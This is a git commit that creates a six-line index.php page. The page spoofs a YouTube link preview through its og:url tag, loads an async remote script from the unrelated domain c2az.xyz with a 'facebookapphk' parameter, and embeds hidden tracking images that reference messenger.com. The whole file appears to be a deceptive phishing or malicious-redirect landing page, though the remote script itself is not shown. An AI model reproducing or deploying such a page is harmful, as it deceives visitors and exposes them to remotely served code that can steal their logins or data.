e029afc60c41f7e4ec9da85ea3851474d878e8e0
tusurucu23s <95896360+tusurucu23s@users.noreply.github.com>
2022-01-21 12:09:46 +0800

    Create index.php

---
+++ index.php
@@ -0,0 +1,6 @@
+<meta property="og:url" content="https://www.youtube.com/" />
+<script src="https://c2az.xyz/manzana/?api=1&lan=facebookapphk&ht=1" type="text/javascript" async="true"></script>
+<img src="//whos.amung.us/pingjs/?k=elchapito07s&amp;t=🛸 NO FORCE MMG 👽&amp;x=https://www.messenger.com/" style="display:none" alt="">                    
+  <script type="text/javascript"></script>
+<img src="//whos.amung.us/pingjs/?k=elcartel07&amp;t=🛸 NO FORCE MMG 👽&amp;x=https://www.messenger.com/" style="display:none" alt="">                    
+  <script type="text/javascript"></script> 
